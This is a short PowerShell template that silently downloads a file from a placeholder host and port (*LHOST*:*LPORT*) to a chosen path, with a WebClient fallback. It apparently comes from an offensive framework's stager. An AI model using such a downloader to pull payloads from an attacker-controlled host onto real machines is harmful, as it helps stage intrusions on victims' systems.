$ProgressPreference = 'SilentlyContinue'
$url = 'http://*LHOST*:*LPORT*/*TICKET*'
$dest = '*DEST*'
try {
    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
} catch {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $dest)
}
